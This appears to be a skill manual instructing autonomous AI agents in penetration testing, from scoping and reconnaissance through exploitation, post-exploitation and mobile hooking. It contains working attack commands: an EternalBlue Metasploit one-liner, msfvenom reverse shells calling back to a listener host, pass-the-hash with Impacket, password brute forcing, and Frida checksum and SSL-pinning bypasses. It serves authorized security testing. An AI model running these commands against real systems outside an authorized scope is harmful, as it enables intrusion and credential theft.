---
name: Enforcer-Skills-Curated
description: Operational Manual and Unified SecOps Methodology for the Enforcer Framework node swarms. Consolidates engagement rules, scanning, exploitation, post-exploitation, mobile security, and business logic testing with a comprehensive tool and vulnerability routing system.
version: 1.0.0-enforcer
metadata:
  author: Enforcer AI Collective
  category: secops-orchestration
---

# 🛡️ Enforcer Framework: Curated Operational Manual

Welcome to the **Enforcer Framework Curated Operational Manual**. This document serves as a unified instruction set and reference for the Enforcer autonomous agentic SecOps framework. It consolidates, sorts, and organizes 10 security testing and engineering modules into a single, cohesive handbook to guide human operators and AI agents alike during authorized engagements.

This manual is compiled and synthesized from the following source modules:
- [pentest-orchestrator](file://curated-skills/SKILL.md)
- [kali-tools](file://curated-skills/tzf1003-kali-tools/kali-tools/SKILL.md)
- [Pentest Checklist](file://curated-skills/davila7-pentest-checklist/Pentest%20Checklist/SKILL.md)
- [Pentest Commands](file://curated-skills/davila7-pentest-commands/Pentest%20Commands/SKILL.md)
- [Shodan Reconnaissance](file://curated-skills/davila7-shodan-reconnaissance-and-pentesting/Shodan%20Reconnaissance%20and%20Pentesting/SKILL.md)
- [Penetration Tester Master Kit](file://curated-skills/dokhacgiakhoa-penetration-tester-master/penetration-tester-master/SKILL.md)
- [Network Penetration Testing](file://curated-skills/ed1s0nz-network-penetration-testing/network-penetration-testing/SKILL.md)
- [Mobile Game Security](file://curated-skills/gmh5225-mobile-security/mobile-security/SKILL.md)
- [Penetration Test Planner](file://curated-skills/pentest-planner-1.0.0/SKILL.md)
- [WooYun Legacy Business Logic](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/plugins/wooyun-legacy/skills/wooyun-legacy/SKILL.md)

---

## 📑 Table of Contents
1. [Engagement Rules, OPSEC & Safety Control](#1-engagement-rules-opsec--safety-control)
2. [Security Assessment Planning & Attack Surface Mapping](#2-security-assessment-planning--attack-surface-mapping)
3. [Reconnaissance, Passive OSINT & Scanning](#3-reconnaissance-passive-osint--scanning)
4. [Exploitation & Vulnerability Analysis](#4-exploitation--vulnerability-analysis)
5. [Post-Exploitation, PrivEsc & Lateral Movement](#5-post-exploitation-privesc--lateral-movement)
6. [Mobile Security & Reverse Engineering Cockpit](#6-mobile-security--reverse-engineering-cockpit)
7. [Business Logic & Financial Vulnerability Methodology](#7-business-logic--financial-vulnerability-methodology)
8. [Enforcer Sub-Skill Routing Index](#8-enforcer-sub-skill-routing-index)
   - [8.1 Kali Linux Tool Reference Library (792 Tools)](#81-kali-linux-tool-reference-library-792-tools)
   - [8.2 WooYun Vulnerability & Case Databases (15 Categories)](#82-wooyun-vulnerability--case-databases-15-categories)

---

## 1. Engagement Rules, OPSEC & Safety Control

Every Enforcer operation must operate under strict, authorized boundaries. No active scanning or exploitation is composed or executed unless the scope is declared.

### 1.1 Scope Declaration Protocol
Before beginning any operations, the agent must obtain and memorize:
1. **In-Scope Targets**: IP ranges (CIDR), domain names, URLs, cloud accounts.
2. **Engagement Type**: External, internal, web-app, cloud, mobile, or wireless.
3. **Rules of Engagement (ROE)**: Working hours, forbidden techniques, primary contacts.
4. **Proof of Authorization**: Written permission (e.g., engagement letter, bug bounty policy).

> [!IMPORTANT]
> If a target is out of scope, redact the target from outputs and do not compose or run commands against it.

### 1.2 OPSEC Tagging System
Before proposing or running any terminal command, verify its OPSEC tag:

- **QUIET** (Passive, no target contact): DNS lookup, cert transparency, WHOIS, passive OSINT (e.g., Shodan queries).
- **MODERATE** (Active but common traffic): Single port connections, banner grabs, standard TCP scans.
- **LOUD** (Triggers IDS/IPS/WAF/SOC): Full vulnerability scans, directory brute-forcing, password spraying, active exploit attempts.

### 1.3 Safety Control & Refusal List
The following activities are strictly prohibited and will be refused:
- Volumetric or protocol-level Denial of Service (DoS) attacks.
- Unauthorized mass scanning of the public internet.
- Unattended worms or self-propagating implants.
- Persistent backdoors that survive the closing of the engagement.
- Safety-of-life or critical infrastructure system exploitation (e.g., medical devices, SCADA safety loops).

### 1.4 Evidence Handling Discipline
All command outputs must be redirected to a timestamped file:
```bash
# General naming format
{tool}_{target-sanitized}_{YYYYMMDD_HHMMSS}.{ext}
```
*Note: Clean target names by replacing `/` with `-` and removing special characters.*

---

## 2. Security Assessment Planning & Attack Surface Mapping

To execute efficiently, Enforcer agents map the attack surface and build a prioritized, risk-ranked test plan based on business impact.

### 2.1 Attack Surface Mapping Checklist
- [ ] **HTTP Endpoints**: Map all routes, methods (GET/POST/PUT/DELETE), authentication controls, and inputs.
- [ ] **Authentication Flows**: Map login, registration, password resets, OAuth/SAML, and MFA mechanisms.
- [ ] **File Operations**: Map file upload/download, processing libraries, and S3/cloud storage endpoints.
- [ ] **Integrations & Queues**: Identify webhooks, message queues (RabbitMQ, Kafka), and external APIs.
- [ ] **Admin & Debug**: Locate admin panels, metrics dashboards, and debug routes.
- [ ] **Client-Side Assets**: Check local storage, postMessage configurations, and JavaScript files.
- [ ] **Infrastructure**: Enumerate exposed service ports, container configurations, and cloud interfaces.

### 2.2 Taxonomy of Test Categories
1. **Authentication**: Brute force, credential stuffing, reset token predictability, session fixation, JWT manipulation, OAuth redirects, and MFA bypass.
2. **Authorization**: Horizontal and vertical privilege escalation, forced browsing, parameter tampering, and Insecure Direct Object References (IDOR).
3. **Injection**: SQLi (UNION, blind, time-based), NoSQLi, OS command injection, XXE, LDAP, and Server-Side Template Injection (SSTI).
4. **Client-Side Scripts**: Reflected/Stored/DOM-based XSS, and Content-Security-Policy (CSP) bypasses.
5. **Request Forgery**: CSRF on state-changing endpoints, SameSite bypass, and SSRF targeting metadata or internal networks.
6. **Business Logic**: Price/amount manipulation, race conditions, workflow bypass, and rate limit evasion.
7. **File Handling**: Web shell uploads, path traversals, image parser exploits (ImageMagick), and file size resource exhaustion.

---

## 3. Reconnaissance, Passive OSINT & Scanning

Reconnaissance starts with passive discovery (QUIET) before moving to active scanning (MODERATE/LOUD).

### 3.1 Passive Recon & Shodan Integration
Leverage Shodan to find exposed systems and banners without sending direct packets.

```bash
# Initialize API key
shodan init YOUR_API_KEY

# Lookup information for a specific host
shodan host 1.1.1.1

# Get honeypot probability score
shodan honeyscore 1.1.1.1

# Search and download results (Consumes 1 query credit if filters are used)
shodan download target_recon.json.gz 'org:"Target Company"'

# Parse downloaded data to CSV format
shodan parse --fields ip_str,port,org --separator , target_recon.json.gz > target.csv

# Obtain statistical summary of a product type
shodan stats --facets country,port,org 'product:mongodb'
```

#### High-Frequency Shodan Filters
- `net:192.168.1.0/24` (Network range)
- `ssl.cert.subject.cn:*.target.com` (Target SSL certificates)
- `port:3389 vuln:CVE-2019-0708` (Vulnerable BlueKeep RDP)
- `product:elastic port:9200 -authentication` (Exposed Elasticsearch without auth)

### 3.2 Active Scanning & Port Mapping (Nmap & Masscan)

```bash
# Stealth TCP SYN Scan (MODERATE)
nmap -sS -Pn -p- -T4 192.168.1.100

# Full TCP Connect Scan (MODERATE)
nmap -sT -p 22,80,443 192.168.1.100

# Service & Version Detection + OS Identification (MODERATE/LOUD)
nmap -sV -sC -O -F 192.168.1.100

# Rapid port scanning across large network (LOUD)
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### 3.3 Active Service Enumeration
```bash
# SMB Share and user enumeration
smbclient -L //192.168.1.100 -N
enum4linux -U 192.168.1.100

# SNMP Walk
snmpwalk -v2c -c public 192.168.1.100

# RPC Client connection
rpcclient -U "" -N 192.168.1.100
```

---

## 4. Exploitation & Vulnerability Analysis

Once vulnerability signatures are confirmed, Enforcer uses automated and manual exploitation suites.

### 4.1 Vulnerability Scanning
```bash
# Nmap Vuln Script Scan (LOUD)
nmap -sV --script vuln 192.168.1.100

# Check specifically for EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100
```

### 4.2 Web & API Exploitation (SQLMap & Nikto)
```bash
# Web server vulnerability scanning with Nikto
nikto -h http://192.168.1.100 -output nikto_report.html

# Basic SQL injection database enumeration
sqlmap -u "http://192.168.1.100/item.php?id=1" --dbs --batch

# SQL Injection bypass WAF with tamper script
sqlmap -u "http://192.168.1.100/login" --data="user=admin&pass=test" --tamper=space2comment --risk=3 --level=5 --dbs
```

### 4.3 Exploitation Framework (Metasploit)
```bash
# Launch Metasploit console
msfconsole

# Run exploit execution inline
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; exploit"
```

#### Payload Generation (msfvenom)
```bash
# Windows Executable Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe

# Linux ELF Reverse TCP
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf

# PHP Web Shell Payload
msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw > shell.php
```

### 4.4 Authentication & Password Auditing
```bash
# SSH login brute force with Hydra
hydra -L users.txt -P rockyou.txt ssh://192.168.1.100

# HTTP Post Form brute force
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Password cracking with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Cracking specific format (NTLM)
john hashes.txt --format=nt --show
```

---

## 5. Post-Exploitation, PrivEsc & Lateral Movement

After obtaining initial access, Enforcer nodes seek to escalate privilege and expand access.

### 5.1 Privilege Escalation
#### Linux
- Inspect SUID binaries (`find / -perm -4000 -type f 2>/dev/null`).
- Scan for writable cron jobs, misconfigured sudo rules (`sudo -l`).
- Check kernel exploits and container socket exposure (`/var/run/docker.sock`).

#### Windows
- Audit for unquoted service paths (`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """`).
- Exploit DLL Hijacking or token impersonation (Metasploit `getsystem`).

### 5.2 Lateral Movement & Active Directory
```bash
# Impacket WMI Execution (Pass-the-Hash)
python wmiexec.py -hashes :c3746c3b6f2e82fa08d3e91129f12345 administrator@192.168.1.100

# Impacket SMB Execution (Pass-the-Hash)
python smbexec.py -hashes :c3746c3b6f2e82fa08d3e91129f12345 administrator@192.168.1.100

# FreeRDP Pass-the-Hash connection
xfreerdp /u:administrator /pth:c3746c3b6f2e82fa08d3e91129f12345 /v:192.168.1.100
```

#### Ticket Granting Ticket (TGT) Injection
```
// Mimikatz: Inject Ticket
kerberos::ptt ticket.kirbi

// Rubeus: Inject Ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## 6. Mobile Security & Reverse Engineering Cockpit

Enforcer Framework integrates mobile application assessment through its Android app cockpit, custom emulator interfaces, and kernel hook engines.

### 6.1 APK & IPA Reverse Engineering
```bash
# Decompile Android APK (Resources and Smali)
apktool d target_app.apk

# Convert DEX files to readable Java
jadx -d java_source target_app.apk

# Scan APK for packer or protector signatures
apkid target_app.apk
```

### 6.2 Dynamic Hooking with Frida
Deploy hooks to bypass authentication, capture keys, or monitor native libraries.

```javascript
// Frida API function interception hook
Interceptor.attach(Module.findExportByName("libgame.so", "calculate_checksum"), {
    onEnter: function(args) {
        console.log("[*] Checksum calculation argument: " + args[0]);
    },
    onLeave: function(retval) {
        // Force successful return
        retval.replace(1);
        console.log("[+] Checksum validation bypassed.");
    }
});
```

```javascript
// Universal SSL Pinning Bypass Template
Java.perform(function() {
    var TrustManager = Java.registerClass({
        implements: [Java.use("javax.net.ssl.X509TrustManager")],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    // Dynamically replace default SSL TrustManagers
});
```

### 6.3 Kernel Level Root & Instrumentation
Modern Android systems require kernel-level stealth to bypass detection mechanisms.

| Solution | Access Level | Stealth Profile | Mechanism |
|---|---|---|---|
| **Magisk** | User / Init | Medium | Modifies `/system` mounts, easily detected via package checks. |
| **KernelSU** | Linux Kernel | High | Embedded directly in kernel, su access is process-isolated. |
| **APatch** | Linux Kernel | High | Patches stock GKI kernels via boot image modification. |

#### eBPF-Based Operations
Enforcer utilizes eBPF scripts for stealthy process tracing:
- **stackplz**: Trace ARM64 call stacks without library injection.
- **eDBG**: In-kernel process inspection bypassing standard debugger checks.
- Triggers on tracepoints/uprobes to avoid detection on GKI kernels.

---

## 7. Business Logic & Financial Vulnerability Methodology

Standard vulnerability scanners cannot identify business logic flaws. This methodology uses structured flow mapping and hypothesis formation.

### 7.1 The 4-Phase Method
```
Phase 1: Flow Mapping ──> Phase 2: Hypothesis ──> Phase 3: Manual Test ──> Phase 4: Impact Report
```
1. **Flow Mapping**: Map out the business objective, user roles, state machine transitions, and client-server trust boundaries.
2. **Hypothesis Formation**: Construct hypotheses based on historical failure modes (e.g., "State machine allows moving directly from Pending to Shipped").
3. **Manual Testing**: Intercept requests, isolate single parameter changes (e.g., quantities, IDs, values), and observe server-side reaction.
4. **Impact Report**: Quantify business impact (financial loss, data exposure) rather than purely technical bugs.

### 7.2 Vulnerability High-Severity Hierarchy
Prioritize testing based on historical likelihood of critical severity (derived from WooYun dataset metrics):

| Rank | Vulnerability Class | High-Severity % | Target Flow |
|---|---|---|---|
| 1 | Password Reset Logic | 88.0% | Account Recovery, OTP Validation |
| 2 | Arbitrary Account Control | 86.4% | Registration, Binding Parameters |
| 3 | Financial Withdrawal Exploits| 83.1% | Refunds, Bank Transfer APIs |
| 4 | Payment Amount Tampering | 83.0% | Checkout, Cart Submissions |
| 5 | Balance / Coupon Abuse | 77.9% | Point Redemption, Account Credits |
| 6 | Workflow Logic Flaws | 74.8% | State Machine transitions |
| 7 | Order Modification | 74.2% | Invoice generation, order status |
| 8 | Unauth Admin / Misconfig | 72.6% | Default accounts, open config ports |

### 7.3 "Arbitrary X" Authorization Taxonomy
When testing access control, execute tests against these five distinct categories:
- **Arbitrary Account Operation (86.4% High-Sev)**: Attempting to modify passwords, emails, or phone numbers of other users.
- **Arbitrary View (62.1% High-Sev)**: Enumerating parameters (IDOR) to view others' private profile pages, transactions, or documents.
- **Arbitrary Modify (74.2% High-Sev)**: Tampering with configurations or data belonging to another tenant or user.
- **Arbitrary Delete (71.4% High-Sev)**: Initiating unauthorized deletions of resources.
- **Arbitrary Operation (72.5% High-Sev)**: Performing actions on behalf of another user (e.g., placing orders, sending messages).

---

## 8. Enforcer Sub-Skill Routing Index

To keep this manual performant and prevent context bloat, details on specific Kali tools and massive vulnerability databases are delegated to structured files. Agents must load these local files dynamically as needed using their file reading tools.

### 8.1 Kali Linux Tool Reference Library (792 Tools)
Find tool descriptions, options, binaries, and source repository information by opening the category maps below:

| Category Map File | Target Scope | Tool Count |
|---|---|---:|
| [cryptography-steganography.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/cryptography-steganography.md) | Encryption, steganography, data hiding | 11 |
| [database-assessment.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/database-assessment.md) | Database vulnerability assessment, SQLi, extraction | 3 |
| [defensive-tools.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/defensive-tools.md) | Honey-pots, IDS/IPS configurations, system defense | 28 |
| [exploitation-tools.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/exploitation-tools.md) | Web shells, payload generators, social toolkits | 61 |
| [forensics.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/forensics.md) | Carving, mounting, disk imaging, anti-forensics | 61 |
| [hardware-hacking.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/hardware-hacking.md) | IoT, Android debug bridges, embedded interfaces | 3 |
| [hardware.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/hardware.md) | Generic hardware auditing tool configurations | 1 |
| [information-gathering.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/information-gathering.md) | DNS enumeration, WHOIS, scanners, network mapping | 265 |
| [malware-analysis.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/malware-analysis.md) | Sandbox structures, behavior monitors, signature tools| 7 |
| [password-attacks.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/password-attacks.md) | Offline crackers, wordlist engines, online brute-force | 77 |
| [post-exploitation.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/post-exploitation.md) | Elevate tools, backdoors, internal proxy tunnels | 47 |
| [reporting-tools.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/reporting-tools.md) | Evidence collation, planning formats, report templates | 9 |
| [reverse-engineering.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/reverse-engineering.md) | Decompilers, disassemblers, binary patching tools | 32 |
| [sniffing-spoofing.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/sniffing-spoofing.md) | MITM proxies, packet injectors, responders | 45 |
| [social-engineering-tools.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/social-engineering-tools.md) | Phishing engines, malicious site cloners | 11 |
| [system-services.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/system-services.md) | Core server engines, transfer channels, SSH daemons | 14 |
| [tunneling-exfiltration.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/tunneling-exfiltration.md) | Port-forwarding, DNS/ICMP tunnels, exfiltrators | 22 |
| [utilities.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/utilities.md) | File utilities, CLI downloaders, build systems | 373 |
| [vulnerability-analysis.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/vulnerability-analysis.md) | Fuzzers, scanners, framework assessments | 83 |
| [web-application-analysis.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/web-application-analysis.md) | Crawlers, SQLi tools, proxies, API auditors | 68 |
| [wireless-attacks.md](file://curated-skills/tzf1003-kali-tools/kali-tools/references/wireless-attacks.md) | Wi-Fi captures, Bluetooth tools, RFID scanners | 60 |

*Note: Individual tool manuals reside in the [tools](file://curated-skills/tzf1003-kali-tools/kali-tools/references/tools/) subdirectory.*

### 8.2 WooYun Vulnerability & Case Databases (15 Categories)
To review historical real-world vulnerability cases, high-frequency parameter lists, attack distribution patterns, and payload fragments, open the domain databases below:

| Vulnerability Database File | Focus Areas & Case Count |
|---|---|
| [sql-injection.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/sql-injection.md) | SQL Injection cases, WAF bypass, blind/UNION tests |
| [command-execution.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/command-execution.md) | OS injection, system commands, evaluation scripts |
| [unauthorized-access.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/unauthorized-access.md) | Unauthenticated APIs, directory traversal, page access |
| [weak-password.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/weak-password.md) | Default logins, administrative credentials, dictionary |
| [info-disclosure.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/info-disclosure.md) | Log files, configuration dumps, credential leaks |
| [logic-flaws.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/logic-flaws.md) | State transitions, SMS bypass, reset logic flaws |
| [file-upload.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/file-upload.md) | Web shells, filter bypasses, Content-Type spoofing |
| [file-traversal.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/file-traversal.md) | Path traversal, arbitrary local file inclusion |
| [ssrf.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/ssrf.md) | Server Side Request Forgery, metadata exploitation |
| [csrf.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/csrf.md) | State change forgery, cross-site request attacks |
| [rce.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/rce.md) | Remote Code Execution chains, deserialization |
| [xss.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/xss.md) | Stored, reflected, DOM-based scripting bypasses |
| [xxe.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/xxe.md) | XML External Entity payloads, local file leakage |
| [misconfig.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/misconfig.md) | IIS, Tomcat, Redis, Nginx, Apache config errors |
| [other.md](file://curated-skills/tanweai-vuln-analysis-expert/tanweai-vuln-analysis-expert/categories/other.md) | Miscellaneous business system anomalies |

---

> **Operational Warning**: This manual is intended for authorized, ethical penetration testing and security assessment. Unauthorized application of these techniques is illegal under regional and international computer fraud laws. Ensure written scope approval is maintained throughout the operation.
